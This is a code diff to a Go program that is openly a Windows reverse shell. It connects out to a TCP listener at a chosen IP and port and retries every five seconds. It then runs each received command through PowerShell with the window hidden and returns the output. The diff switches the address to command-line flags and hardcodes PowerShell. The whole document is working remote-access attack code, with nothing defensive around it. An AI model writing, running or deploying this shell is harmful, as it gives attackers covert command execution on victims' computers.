@@ -14,28 +14,14 @@ import (
 )
 
 func main() {
-	var terminal = ""
-	//ipaddr := flag.String("a","127.0.0.1","ip")
-	ipaddr := "127.0.0.1"
-	//port := flag.Int("p",1234,"port")
-	port := "1234"
-	//term := flag.String("t","p","Cmd/Powershell")
-	term := "p"
+	ipaddr := flag.String("a","127.0.0.1","ip")
+	port := flag.Int("p",1234,"port")
 	flag.Parse()
-	address := fmt.Sprintf("%s:%d",ipaddr, port)
-	//chose witch terminal to use
-	switch term {
-	case "cmd":
-		terminal = "cmd"
-	case "pwsh":
-		terminal = "powershell"
-	default:
-		terminal = "powershell"
-	}
-	reverse(address,terminal)
+	address := fmt.Sprintf("%s:%d",*ipaddr, *port)
+	reverse(address)
 }
 
-func reverse(host string,term string) {
+func reverse(host string) {
 	//Connect to the listener
 	c, err := net.Dial("tcp", host)
 	if err != nil {
@@ -44,7 +30,7 @@ func reverse(host string,term string) {
 		}
 		//Try to reconnect every 5 sec
 		time.Sleep(5*time.Second)
-		reverse(host,term)
+		reverse(host)
 	}
 	fmt.Println("Connected... :)")
 
@@ -81,7 +67,7 @@ func reverse(host string,term string) {
 			c.Close();
 			os.Exit(0)
 		default:
-			cmd := exec.Command(term, "/C", cmd)
+			cmd := exec.Command("powershell", "/C", cmd)
 			//Hide windows
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			//Read and print output
